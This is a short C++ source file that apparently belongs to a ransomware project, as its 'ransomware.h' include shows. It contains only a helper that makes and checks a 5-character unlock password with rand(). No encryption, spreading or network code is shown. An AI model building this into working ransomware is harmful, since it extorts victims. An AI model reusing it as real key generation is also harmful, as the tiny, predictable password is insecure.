#include "ransomware.h"
#include <iostream>
#include <cstdlib>
#include <ctime>
using namespace std;

// Stores the generated password globally within this file
static string GeneratedPassword = "";

string GenerateRandomPassword() {
    const string charset = "0123456789abcdefghijklmnopqrstuvwxyz";  // Allowed characters for the Password
    const int length = 5;                                           // Length of the Password.
    string password = "";                                           // Variable to store in the password.

    for (int i = 0; i < length; ++i) {          // Loop to randomly pick 5 characters from the charset
        int index = rand() % charset.length();  // Generate a random index which will be used to select the characters for the password
        password += charset[index];             // Append the character to the password
    }
    GeneratedPassword = password;               // Store the password for verification later
    return password;                            // Return the new password
}

bool VerifyPassword(const string& password) {
    return password == GeneratedPassword;       // Compares a given password with the previously generated one. If it matches return TRUE else FALSE
}

string GetGeneratedPassword() {
    return GeneratedPassword;                   // Returns the currently stored/generated password (for testing/debugging).
}
